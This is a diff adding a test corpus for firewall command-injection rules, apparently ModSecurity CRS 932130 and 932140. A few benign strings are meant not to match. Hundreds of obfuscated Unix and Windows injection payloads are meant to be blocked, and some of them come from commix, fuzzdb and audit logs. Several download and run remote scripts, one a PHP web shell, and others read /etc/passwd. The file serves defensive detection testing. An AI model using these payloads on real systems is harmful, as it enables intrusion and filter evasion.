@@ -1,0 +1,666 @@
+# should not be positive
+ceci n'est pas un wget so this shouldn't match 1
+curling & wgetting are fun so this shouldn't match 2
+{idiots} && ccnumbers || nicely; formatted strings should not match 3
+Unix ;Bash is case-sensitive and should not match 4
+Some {cats are} missing a word boundary and should not match 5
+wgettery is not rce and should not match 6
+;.
+ls
+1 &gt; .999... 9
+\r\n..and this is exactly what modern day GCC is capable of doing 10
+; ..most are fine and everything below should be blocked 11
+
+# command injection (unix)
+;cat index.php
+;wget ...
+index.jpg;wget ...
+index.jpg;;wget ...
+foo ;hostid ...
+foo ; hostid ...
+foo ; lsb_release ...
+foo & lsb_release ...
+foo | lsb_release ...
+foo | lsb\_release ...
+foo && hostid ...
+foo &&"hostid" ...
+foo ||hostid ...
+foo || hostid ...
+foo \nhostid ...
+foo \n locate foo ...
+foo \r\nlspci ...
+foo \r lsusb ...
+foo \r\n lsmod ...
+foo $(lspci ...)
+foo $( 'lspci' ...)
+foo $((lsusb ...))
+foo $(( 'lsmod' ...))
+foo ${ ftp }
+foo <( lftp blah )
+foo >( "lftp" foo )
+foo `lftp ...`
+foo ` /usr/bin/'adduser' ...`
+foo;FOO=BAR adduser
+foo;FOO=BAR BAZ=QUX adduser
+foo;FOO=BAR 'adduser'
+foo;FOO=BAR "adduser"
+foo;FOO='BA BAR' "adduser"
+foo;FOO="BARBARIC" "adduser"
+foo;FOO=$FOO "adduser"
+foo;FOO=$(false ) "adduser"
+foo;FOO=$( false ) "adduser"
+foo;FOO=$(( 1 + 2 )) "adduser"
+foo;FOO=<( false ) "adduser"
+foo;FOO=>( false ) "adduser"
+foo;FOO=${ false } "adduser"
+foo;other_variable_1=2 adduser
+foo||{ FOO=1 adduser ...}
+foo||{ F=1 G=2 "adduser" ... }
+foo||{ F=1 G='blah blah' "adduser" ... }
+foo||(eval ...)
+foo|| ( eval ...)
+foo|| ( X=3 eval ...)
+foo|| ( X=3 $'eval' ...)
+foo||'eval ...'
+foo&&'eval' ...
+foo&&''eval'' ...
+foo&&'''eval''' ...
+foo&&''gzip ...
+foo&&''''gunzip ...
+foo&&''""''gzip ...
+foo&&''""''gunzi''''p ...
+foo&&g''''''z''''''''''ip ...
+foo&&g""''""un""\z\i''''''''''\p ...
+foo&&wg''''''e"t" ...
+foo&&w'g''e'"""""""t" ...
+foo&&\w'g'\e""""""'t' ...
+foo&&'''''''w''g''e''t' ...
+foo&&''""''""\w\g""''\e"t" ...
+foo&& 'gzip' ...
+foo&&"gzip ..."
+foo&&""gzip ...""
+foo&&"gzip" ...
+foo&&""gzip"" ...
+foo&& "gzip" ...
+foo&& ""gzip"" ...
+foo && echo hi
+foo && 'echo' hi
+
+foo;bin/ls
+foo;/bin/ls
+foo;/bin/\ls
+foo;\/bin/\ls
+foo;\/\bin/\ls
+foo;//bin/ls
+foo;//bin//ls
+foo;/./bin//ls
+foo;../bin/ls
+foo;../bin/l\s
+foo;../bin\/l\s
+foo;./../bin/ls
+foo;./'..'/bin/ls
+foo;./\.\./bin/ls
+foo;'bin'/ls /
+foo;"bin"/ls .
+foo;"bin"/"ls"
+foo;/"bin"/"ls"
+foo;/"bin"\/"ls"
+foo;\/"bin"\/"ls"
+foo;\/\b\i\n\/\l\s
+foo;\/\b\i\n\/\.\/\l\s
+foo;(\/\b\i\n\/\.\/\l\s)
+foo;{(\/\b\i\n\/\.\/\l\s)}
+foo;/usr/bin/ls
+foo;/usr/bin//ls
+foo;/usr/local/bin/curl
+foo;'/usr/local/bin/curl'
+foo;"/usr/local/bin/curl"
+foo;/usr/./local/bin/bash
+foo;/usr/\./local\/bi\n/ba\sh
+foo;/usr/./local//bin/bash
+foo;/./usr/./local/./bin/bash
+foo;././usr/./local/./bin/bash
+
+foo;/usr/bin/'wget'
+foo;/usr/'bin'/'wget'
+foo;(/usr/bin/wget)
+foo;( /usr/bin/'wget' )
+foo;{/usr/bin/"wget"}
+foo;{ \/us\r/bi\n\/"wget"}
+foo;{ "/usr/bin/wget" }
+
+foo <( FOO=BAR last )
+foo <( FOO=BAR _baz=QUX last )
+foo <( FOO=BAR _baz='la la la la' last )
+foo <( FOO="BAR"  last )
+foo >( _=1 __=2 last )
+foo >(  FOO='BAR BAR BAR' last )
+>('last')
+>( 'last' )
+>( /usr/bin/last )
+
+foo ; 7z x blah
+foo ; '7'"z" x blah
+foo ; \7\z x blah
+foo ;\ls\o\f ...
+foo ;\l\s\o\f ...
+foo ;'l''s''o''f' ...
+foo ; 'l'"s"of ...
+foo ; 'l'"s"\o\f ...
+foo ; 'c'"h"\m\od ...
+foo ; 'm'"k"\d\ir ...
+foo ; 'c'"h""m"'o'd ...
+foo ; "c""h""m""o"d ...
+
+foo ; \more file
+foo ; ''\m\or\e file
+foo ;"ls"\o\f foo
+foo ;"mk"\d\ir foo
+foo ;"mk"\d\ir foo
+foo ;"mk"'d'\ir foo
+foo ;'mk'""'d'\i""r"" foo
+foo ;"mkdi"r foo
+foo ;"mkd"\i''r foo
+foo ;''m''k''di''r'' foo
+foo ;''''''''""n""e''tc""a""""""""""t foo
+foo ;n"etc"at foo
+foo ;m"ou"n\t /
+foo ;"netcat" foo
+foo ;"n"e't'cat foo
+foo ;bsdtar
+foo ;\b"sd"t"a"r
+foo ; "bzl"es's'
+foo ; \mys\qla\dm\i'n'
+foo ; lw\p-download foox
+
+# funny unix shell stuff
+;if [ -f /var/log/messages ]\nthen\necho "/var/log/messages exists."\nfi
+;a=1 ; b=2 ; if [ $a -eq $b ] ; then echo "equal" ; else echo "not equal" ; fi
+;if [ 1 -eq 2 ]  then echo "equal" ; else echo "not equal" ; fi
+;if list; then list; fi
+;if list; then list; elif list; then list; fi
+;if list; then list; elif list; then list; else list; fi
+;for name do echo 123; done
+;for name; do echo 123; done
+;for dir in /; do ls $dir; done
+;for VARIABLE in 1 2 3 4 5; do echo i; done
+;for VARIABLE in 1 2 3 4 5 \n do echo i \n done
+;for i in {1..5}; do echo i; done
+;for _file in *.txt; do cat _file; done
+;for thisfile in *; do; echo "found $thisfile"; done
+;for ((i=1; i<=10; ++i)); do echo $i; done
+;for ((i=1; i<=10; ++i)) \n do echo $i \n done
+;select name; do list ; done
+;select name [ in word ] ; do list ; done
+;case 1 in 1) echo one;; 2) echo two;; esac
+;case 1 in (1) echo one;; (2) echo two;; esac
+;while true; do ls; done
+;until false; do ls; done
+;a() { echo pwnd; }; a
+;a () { echo pwnd; }; a
+;a ( ) { echo pwnd; }; a
+;a() { ! echo pwnd; }; a
+;a() ( echo noooo; ); a
+;a () { ( echo aaahh; ) }; a
+;a ( ) { ( echo pwnt; ) }; a
+;a ( ) { ( /bin/echo pwnt; ) }; a
+;a ( ) { ( /\b\in/ec\ho pwnt; ) }; a
+;a ( ) { ( A=2 /\b\in/ec\ho pwnt; ) }; a
+;a ( ) { ( A=2 B=$A /\b\in/ec\ho pwnt; ) }; a
+;a ( ) { ( A=2 B=$(gr) /\b\in/ec\ho pwnt; ) }; a
+;a ( ) { ( A=2 B=$(gr) C={ cd . } /\b\in/ec\ho pwnt; ) }; a
+;a ( ) { ( A=\2 B='this is spartaaahh' /\b\in/\ec\ho pwnt; ) }; a
+;function a() ( echo aaahh; ); a
+;function a( ) { echo aaahh; }; a
+;function a () { ( echo aaahh; ) }; a
+;function a ( ) { ( /\bi\n/ec\ho pwnt; ) }; a
+;a=ls; ${a}
+;a=ls; $a
+;a='uname -a'; $a
+;a= 'uname -a'; $a
+;a=\  "uname -a"; $a
+;$'ls'
+;$"ls"
+;! ls
+;! (ls)
+;! 'l's
+;! $'l's
+;! $'ls'
+;! $"l""s"
+;($"ls")
+;/?in/ls
+;/*in/ls
+;/[b]in/ls
+;/[ab]in/ls
+;/[a-b]in/ls
+;/[a\|b]in/ls
+;/?(b)in/ls
+;/+(b)in/ls
+;source index.php
+;source ./index.php
+;. foo
+;. lala
+;. /lala
+;. index.php
+;. ./index.php
+; . ./index.php
+;`false` ls
+;$(false) ls
+;${false} ls
+;$(false) ${false} ls
+
+# csh
+;foreach i ( a b ) echo $i; end
+;switch (1)\n case 1: \n ls \n endsw
+;while (1)\n ls\n end
+
+# command injection (Windows)
+foo |cmd
+foo |attrib ...
+foo | attrib ...
+foo |  attrib ...
+foo |  ,attrib ...
+foo |  ,@attrib ...
+foo |  @ attrib ...
+foo |  @, @attrib ...
+foo |  @ @ attrib ...
+foo |  @,@^attrib ...
+foo |  @ cmd
+foo |  @(cmd)
+foo |  (@cmd)
+foo |  ((@cmd))
+foo |  (@(@(cmd)))
+foo |  (@ (@ ( cmd)))
+foo |  ( @ ( @ ( cmd)))
+foo |  ( @ ( @ (, cmd)))
+foo |  (, @ ,,,( @, (, cmd)))
+foo |  (, @ ,,,( @, (, "CMD")))
+foo |  (, @ ,, ,( @, (, ^CMD)))
+foo |  @(@, @ ,, ,( @, (, ^c^m^d)))
+foo |  ,,,,@,@@@,@@@@@@(@@@, @@@ ,@, @,@(@ @@,@ @(@, @^c^m^D)))
+foo |  ,,,,@@,@@,@@@@@@(@@@, @@@ ,@, @,@(@ @@,@ @(@, @^c:\windows\system32\cmd.exe)))
+foo |  @,,@,,@@,@@@,@@@@@@,(@@@, @@@ ,@, @,@(@ @@,@ @(@, @"c":\windows\system32\c^m^d.exe)))
+foo &attrib ...
+foo & 'attrib' ...
+foo &  cmd ...
+& {cmd}
+& systempropertiesadvanced
+& powercfg /?
+& powercfg.exe /?
+& diskmgmt.msc
+& SystemPropertiesDataExecutionPrevention
+
+foo&cmd
+foo&@cmd
+foo&wget
+foo&WgEt
+foo&@WGET
+foo&,WGET
+foo&wget/h
+foo&wget.com/h
+foo&wget.exe/h
+foo&wget.vbs/h
+foo&,wget.vbs/h,
+foo&@wget.vbs/h
+foo&@^wget.vbs/h
+foo&..\Bin\wget
+foo&.\Bin\wget
+foo&.\.\Bin\wget
+foo&Bin\wget
+foo&\Bin\wget
+foo&\.\Bin\wget
+foo&\.\Bin\.\.\wget
+foo&C:\Bin\wget
+foo&C:\.\Bin\.\wget
+foo&"C:\.\Bin\.\wget"
+foo&@"C:"\Bin\wget"
+foo&,"C:"\Bin\wget",
+foo&\Program Files\wget
+foo&\.\Program Files\wget
+foo&\.\Program Files\.\wget
+foo&C:\Program Files\wget
+foo&C:/Program Files\wget
+foo& C:\Program Files\\wget
+foo& C:\Program Files\\"wget"
+foo& "C":\"Program Files"\wget
+foo& "C:\Program Files\wget"
+foo&"C:\Program_Files\cmd"
+foo&c:\Windows\System32\cmd
+foo&C:\\Windows\System32\cmd
+foo&C:\"Windows"\System32\.\cmd
+foo&C:\"Windows"\"System32"\cmd
+foo&C:\"Windows"\.\"System32"\"cmd"
+foo&@"C:"\Windows\System32\cmd"
+foo&,"C:"\Windows\System32\cmd"
+foo& \\Foo\bar\wge"t"
+foo& @\\Foo\bar\wge"t"
+foo& \\"Foo"\"bar"\"wget"
+foo& ,\\"Foo"\"bar"\"wget"
+foo& "\\Foo\bar\wget"
+foo& @"\\Foo\bar\wget"
+foo& ,"\\Foo\bar\wget"
+
+foo & wget ...
+foo & wg^et ...
+foo & wg^e"t" ...
+foo & ^wge^t ...
+foo & ^w^g^e^t ...
+foo & "W"get ...
+foo & "W"ge^t ...
+foo & "W"g"e"t ...
+foo & @wget ...
+foo & @@@wget ...
+foo & ,wget ...
+foo & ,,,wget ...
+foo & @,@@@,@,@,,wget ...
+foo | "C":"\Bin\wget"
+foo | "C"":""\Bin""\wget"
+foo | "C"":^\Bin"\wget"
+foo | ^C":^\Bi^n\^wge^t
+foo | ^C^:^\Bi^n\"wget"
+foo | ^C^:^\^B^i^n^\^w^g^e^t
+foo & ^\Fo^o\^Ba^r^\^c^m^d
+foo & ^\Fo^o\^Ba^r^\^w^g^e^t
+foo & ^\Fo^o\^Ba^r^\cm^d
+foo & ^\Fo^o\^Ba^r^\powershell
+foo & ^\Fo^o\^Ba^r^\power"shell"
+foo & ^\Fo^o\"Bar"\"wget"
+foo & "\Fo"^o\"Bar"\"wget"
+foo & "\\Fo"^o\"Bar"\"wget.exe"
+foo & @^\^\Fo"^o\"Bar"\"wget.exe"
+foo & @,^\^\Fo"^o\"Bar"\"wget.exe"
+
+# misc
+foo;wget http://example.com/blah.txt
+foo;curl http://example.com/blah.txt
+foo;fetch http://example.com/blah.txt
+foo;sh blah.txt
+foo;s\h blah.txt
+foo;;; sh blah.txt
+foo||wget http://example.com/blah.txt
+foo||sh blah.txt
+foo `wget http://blah`;
+v;wget http://example.com/foo|
+Doc1.pdf | Dir c:\
+;cat pass
+a;"/bin/m"kd"ir"
+foo;cat <('l''s')
+
+# commix - unix payloads
+;str=$(echo ABCDEF)
+;str1=$(expr length "$str")
+;if [ 6 != $str1 ]; then sleep 0; else sleep 1; fi
+|[ 9 != $(echo HLRTTG |tr -d '\\n' |wc -c) ]
+&sleep 0
+&&str=$(echo YLPOHG)
+&&str1=$(expr length \"$str\")
+&&[ 8 -eq $str1 ] &&sleep 1
+|echo RVSPSL>/tmp/RVSPSL.txt
+|[ 9 -ne $(cat /tmp/RVSPSL.txt|tr -d '\\n'|wc -c) ]
+;echo FYVZVP > /tmp/FYVZVP.txt
+&&str=$(echo FYVZVP>/tmp/FYVZVP.txt)
+&&str=$(cat /tmp/FYVZVP.txt)
+&&str1=${#str} &&[ 1 -eq ${str1} ] &&sleep 1 &
+&echo GVPEAL$((34+90))$(echo GVPEAL)GVPEAL'
+
+# commix - windows payloads
+|cmd /c "powershell.exe -InputFormat none write 'FJQPVY'.length"
+|for /f "delims=" %i in ('cmd /c "powershell.exe -InputFormat none write 'FJQPVY'.length"') do if %i==6 (cmd /c "powershell.exe -InputFormat none Start-Sleep -s 2")
+&powershell.exe -InputFormat none Add-Content ABCDEF.txt ABCDEF
+-InputFormat none Add-Content ABCDEF.txt ABCDEF
+-In^putFor^mat none Sta^rt-Sl^eep -s 2
+-In^putFor^mat none sta^rt-sl^eep -s 2
+
+# fuzzdb
+/index.html|id|
+;id;
+;id
+;netstat -a;
+;id;
+|id
+|/usr/bin/id
+|id|
+|/usr/bin/id|
+||/usr/bin/id|
+|id;
+||/usr/bin/id;
+;id|
+;|/usr/bin/id|
+\n/bin/ls -al\n
+\n/usr/bin/id\n
+\nid\n
+\n/usr/bin/id;
+\nid;
+\n/usr/bin/id|
+\nid|
+;/usr/bin/id\n
+;id\n
+|usr/bin/id\n
+`id`
+`/usr/bin/id`
+a);id
+a;id
+a);id;
+a;id;
+a);id|
+a;id|
+a)|id
+a|id
+a)|id;
+a|id
+|/bin/ls -al
+a);/usr/bin/id
+a;/usr/bin/id
+a);/usr/bin/id;
+a;/usr/bin/id;
+a);/usr/bin/id|
+a;/usr/bin/id|
+a)|/usr/bin/id
+a|/usr/bin/id
+a)|/usr/bin/id;
+a|/usr/bin/id
+;system('cat /etc/passwd')
+;system('id')
+;system('/usr/bin/id')
+\ncat /etc/passwd
+\n/usr/bin/id
+\nid
+\n/usr/bin/id\n
+\nid\n
+& ping -i 30 127.0.0.1 &
+& ping -n 30 127.0.0.1 &
+\r ping -i 30 127.0.0.1 \n
+`ping 127.0.0.1`
+| id
+& id
+; id
+\n id \n
+`id`
+$;/usr/bin/id
+
+# from audit logs
+;wget http://192.168.1.43/shell.txt -O /tmp/shell.php;php -f /tmp/shell.php
+cd /var/tmp && echo -ne \\x3610cker > 610cker.txt && cat 610cker.txt
+blur|9 -quality 75 -interlace line fail.jpg jpeg:fail.jpg ; wget http://example.com/pagat.txt -O pagat.txt ; &phpThumbDebug=9
+blur|9 -quality 75 -interlace line fail.jpg jpeg:fail.jpg;wget http://example.com/blackunix.txt -O blackunix.php;&phpThumbDebug=9
+wget http://example.com/wp-content/uploads/2010/doc.txt ; perl doc.txt ; perl doc.txt ; perl doc.txt ; perl doc.txt ; perl doc.txt ; rm -rf doc.*
+wget http://example.com/res.jpg;lwp-download http://example.com/res.jpg;fetch http://example.com/res.jpg;perl res.jpg;perl res.jpg;perl res.jpg;perl res.jpg;perl res.jpg;rm -rf res.*
+curl -C - -O http://www.example.com/bot.txt;perl bot.txt;rm bot.txt
+
+# rule 932130: unix shell expressions, detected without keyword (false is not in the list)
+$(false)
+${false}
+$((1 + 2))
+<(false)
+>(false)
+
+# rule 932140: windows FOR
+FOR              %a IN (set) DO abc
+FOR /D           %a IN (dirs) DO abc
+FOR /D /D        %a IN (dirs) DO abc
+FOR /F "options" %a IN (text) DO abc
+FOR /F "options" %a IN ("text") DO abc
+FOR /L           %a IN (start,step,end) DO abc
+FOR /L /L /L     %a IN (start,step,end) DO abc
+FOR /R C:\bla    %A IN (set) DO abc
+& FOR %a IN (a,b,c) DO cmd
+& FOR %%a IN (a,b,c) DO cmd
+& FOR %_ IN (a,b,c) DO cmd
+& FOR %2 IN (a,b,c) DO cmd
+& FOR %- IN (a,b,c) DO cmd
+& FOR %/ IN (a,b,c) DO cmd
+& FOR %@ IN (a,b,c)DO cmd
+& FOR %[ IN (a,b,c)DO cmd
+& FOR %] IN (a,b,c)DO cmd
+& FOR %+ IN (a,b,c)DO cmd
+& FOR %~ IN (a,b,c)DO cmd
+& FOR /F "tokens=1-3" %A IN ("jejeje brbr") DO @echo pwnd
+& FOR /F "tokens=1-3" %%A IN   ("jejeje brbr") DO @echo pwnd
+& FOR /F "delims=" %G IN ('SET') DO @Echo %G
+& FOR /F "delims=" %G IN   ('ECHO foo')DO @Echo %G
+& FOR /F "delims=" %~ IN   ('ECHO foo')DO @Echo %G
+For /R C:\temp\ %G IN (*.bak) do Echo del "%G"
+For /R C:\temp\ %%G IN (*.bak) do Echo del "%%G"
+FOR /f "tokens=*" %G IN ('dir /b') DO (call :subroutine "%G")
+FOR /f "tokens=*" %%G IN ('dir /b') DO (call :subroutine "%%G")
+FOR /F "tokens=1-5" %A IN ("This is a short sentence") DO @echo %A %B %D
+FOR /F "tokens=1-5" %%A IN ("This is a short sentence") DO @echo %%A %%B %%D
+FOR %G IN (a,b,c,d,e,f,g,h,i,j,k,l,m,n,o,p,q,r,s,t,u,v,w,x,y,z) DO (md C:\demo\%G)
+FOR %%G IN (a,b,c,d,e,f,g,h,i,j,k,l,m,n,o,p,q,r,s,t,u,v,w,x,y,z) DO (md C:\demo\%%G)
+FOR /L %G IN (1,1,5) DO echo %G
+FOR /L %%G IN (1,1,5) DO echo %%G
+FOR %G IN (Sun Mon Tue Wed Thur Fri Sat) DO echo %G
+FOR %%G IN (Sun Mon Tue Wed Thur Fri Sat) DO echo %%G
+for /f "tokens=*" %G in ('dir /b /s /a:d "C:\Work\reports*"') do echo Found %G
+for /f "tokens=*" %%G in ('dir /b /s /a:d "C:\Work\reports*"') do echo Found %%G
+FOR /D /r %G in ("User*") DO Echo We found %G
+FOR /F "tokens=1,3 delims=," %%G IN (weather.txt) DO @echo %%G %%H
+FOR /F "tokens=4 delims=," %%G IN ("deposit,$4500,123.4,12-AUG-09") DO @echo Date paid %%G
+FOR /F %G IN ('"C:\program Files\command.exe"') DO ECHO %G
+FOR /F %%G IN ('"C:\program Files\command.exe"') DO ECHO %%G
+FOR /F "tokens=1,2* delims=," %% IN (C:\MyDocu~1\mytex~1.txt) DO ECHO %%
+FOR /F "tokens=1,2* delims=," %%G IN (C:\MyDocu~1\mytex~1.txt) DO ECHO %%G
+FOR /F "usebackq tokens=1,2* delims=," %G IN ("C:\My Documents\my textfile.txt") DO ECHO %G
+FOR /F "usebackq tokens=1,2* delims=," %%G IN ("C:\My Documents\my textfile.txt") DO ECHO %%G
+& for /f \"delims=\" %i in ('cmd /c \"set /a (63+21)\"') do @set /p = PDVQIS%iPDVQISPDVQIS< nul
+;for /f \"delims=\" %i in ('cmd /c \"set /a (35+66)\"') do @set /p = LZEUZE%iLZEUZELZEUZE< nul'
+for /f "tokens=* delims=0" %%A in ("%n1%") do set "n1=%%A"
+for %i in (*) do set LIST= %i
+for %i in (*) do set LIST=!LIST! %i
+for /l %%I in (0,1,5) do call echo %%RANDOM%%
+for %%d in (A,C,D) do DIR %%d *.*
+for %%f in (*.TXT *.BAT *.DOC) do TYPE %%f
+for %%P in (%PATH%) do if exist %%P\*.BAT COPY %%P\*.BAT C:\BAT
+
+# rule 932140: windows IF
+IF        EXIST filename.txt     (
+IF        EXIST filename         CMD
+IF        EXIST filename         (CMD)
+IF        EXIST data.xls         Echo The file was found.
+IF        EXIST MyFile.txt       (ECHO Some[more]Potatoes)
+IF        EXIST C:\pagefile.sys  CMD
+IF        EXIST C:\pagefile.sys  (CMD) ELSE (CMD)
+IF    NOT EXIST C:\nonexistent   CMD
+IF /I NOT EXIST C:\nonexistent   echo hey
+IF    NOT EXIST C:\nonexistent   (CMD) ELSE (CMD)
+IF    NOT EXIST (C:\nonexistent) ECHO pwnt
+IF        DEFINED variable       CMD
+IF    NOT DEFINED _example       ECHO Value Missing
+IF        ERRORLEVEL 0           CMD
+IF    NOT ERRORLEVEL 0           CMD
+IF        CMDEXTVERSION 1        GOTO start_process
+IF        2            GEQ 15    echo "bigger"
+IF        "2"          GEQ "15"  echo "bigger"
+IF        %ERRORLEVEL% EQU 2     goto sub_problem2
+IF        %ERRORLEVEL% NEQ 0     echo test
+IF        %ERRORLEVEL% LEQ 2     echo test
+IF        %ERRORLEVEL% GTR 2     echo test
+IF        %ERRORLEVEL% GEQ 2     echo test
+IF        %VARIABLE%   GTR 0     Echo An error was found
+IF        %VARIABLE%   LSS 0     Echo An error was found
+IF        %VARIABLE%   EQU 0     Echo An error was found
+IF /I     item1==item2           CMD
+IF /I NOT item1==item2           CMD
+IF /I NOT 1==2                   CMD
+IF        %_prefix%==SS6         GOTO they_matched
+IF        [%1]==[]               ECHO Value Missing
+IF        [%1] EQU []            ECHO Value Missing 
+IF        (2 GEQ 15)             echo "bigger"
+IF        red==red               echo test
+IF    NOT red===red              echo test
+IF /I     Red==red               echo test
+
+if (1) equ (1) echo hey
+if not (2 equ 2) echo hey
+if "%VAR%"==%%A do echo true
+IF "%~1" == "%~2" (EXIT /B 0) ELSE (EXIT /B 1)
+if %n1% gtr %n2% echo %n1% is greater than %n2%
+if %n1% lss %n2% echo %n1% is less than %n2%
+if %n1% equ %n2% echo %n1% is equal to %n2%
+if "%n1%" gtr "%n2%" echo "%n1%" is greater than "%n2%"
+if "%n1%" lss "%n2%" echo "%n1%" is less than "%n2%"
+if "%n1%" equ "%n2%" echo "%n1%" is equal to "%n2%"
+if not defined n1 set "n1=0"
+IF X%1==X/? GOTO Helpscreen
+IF "%1"=="/?" ...
+IF [%1]==[/?] ...
+IF "%~1"=="/?" ...
+IF ERRORLEVEL 3 IF NOT ERRORLEVEL 4 ...
+IF NOT DEFINED BAR (
+if "%VAR%" == "before" (
+if "%VAR%" == "after" @echo ok
+if "!VAR!" == "after" @echo ok
+if not defined BAR set FOO=1& echo FOO: %FOO%
+if (%1)==(LTRS) CD C:\WORD\LTRS
+if "%1"=="" goto ERROR
+if (AA) == (AA) echo same
+if [AA] == [AA] echo same
+if "A A" == "A A" echo same
+IF %_prog:~-1% NEQ \ (Set _prog=%_prog%\)
+IF EXIST "temp.txt" ECHO found
+IF NOT EXIST "temp.txt" ECHO not found
+IF "%var%"=="" (SET var=default value)
+IF NOT DEFINED var (SET var=default value)
+IF "%var%"=="Hello, World!" (ECHO found)
+IF /I "%var%"=="hello, world!" ( ECHO found )
+IF /I "%var%" EQU "1" ECHO equality with 1
+IF /I "%var%" NEQ "0" ECHO inequality with 0
+IF /I "%var%" GEQ "1" ECHO greater than or equal to 1
+IF /I "%var%" LEQ "1" ECHO less than or equal to 1
+IF /I "%ERRORLEVEL%" NEQ "0" (ECHO execution failed)
+if not %1 == "" (
+if not "%1" == "" (
+if not {%1} == {}
+if not "A%1" == "A" (
+IF DEFINED ARG (echo "It is defined: %1") ELSE (echo "%%1 is not defined")
+
+# direct RCE
+wget www.example.com
+wget http://example.com/foo.txt
+/usr/bin/wget http://example.com/foo.txt
+curl http://example.com/foo.txt
+/usr/local/bin/curl http://example.com/foo.txt
+fetch http://example.com/foo.txt
+lwp-download http://example.com/foo.txt
+echo '<?p''hp ''phpi''nfo();' > index.php
+sh blah.txt
+"sh" blah.txt
+;"sh" blah.txt
+source blah.txt
+. blah.txt
+. ./blah.txt
+. /blah.txt
+ls /
+"ls" /
+;"ls" /
+./bin/ls /
+/bin/ls /
+"/bin/ls" /
+;"/bin/ls" /
+"/bin/l"s /
+\/\b\i\n\/\.\/\l\s
+(\/\b\i\n\/\.\/\l\s)
+echo RVSPSL>/tmp/RVSPSL.txt
+echo FYVZVP > /tmp/FYVZVP.txt
+cat /tmp/FYVZVP.txt
+perl doc.txt
